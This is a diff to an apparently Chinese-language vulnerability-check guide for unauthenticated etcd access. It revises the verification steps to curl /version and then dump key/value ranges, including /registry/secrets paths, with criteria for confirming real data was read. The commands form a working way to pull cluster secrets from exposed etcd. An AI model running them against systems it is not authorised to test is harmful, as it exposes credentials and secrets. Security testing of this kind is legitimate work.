@@ -96,16 +96,19 @@ curl -s http://target:2379/v2/keys/registry/secrets/?recursive=true
 ## 验证方法
 
 ```bash
-# 验证etcd未授权访问
-curl -s -o /dev/null -w "%{http_code}" http://target:2379/version
-# 返回200并包含etcdserver版本信息表示可访问
+# 1) /version：看响应体是不是 etcd 版本 JSON
+curl -s http://target:2379/version
+# 判据：响应体出现 "etcdserver" 与 "etcdcluster" 键，如 {"etcdserver":"3.5.0","etcdcluster":"3.5.0"}
+# 反例：响应体是其它服务的 JSON / 错误页，不含这两个键，即不是 etcd 或不可匿名访问
 
-# 验证数据读取
+# 2) 读取数据：看能不能解出真实的 key/value
 curl -s http://target:2379/v3/kv/range \
-  -X POST -d '{"key":"Lw==","range_end":"MA==","limit":"1"}' | grep -c "kvs"
-# 返回包含kvs字段表示可读取数据
+  -X POST -d '{"key":"Lw==","range_end":"MA=="}' | head -c 600
+# 判据：响应体是 RangeResponse JSON，kvs[] 中 base64 解码后的 key 是真实键路径（如 /registry/secrets/...），value 为对应数据
+# 反例：只有 count 没有 kvs[]，或解出的键为空，说明读不到数据
+# 说明：/version 能访问不等于能读数据，必须落到第 2 步解出键路径才算命中
 
-# HTTPS场景
+# HTTPS 场景同样先看 /version 响应体，再打第 2 步
 curl -sk https://target:2379/version
 ```
 
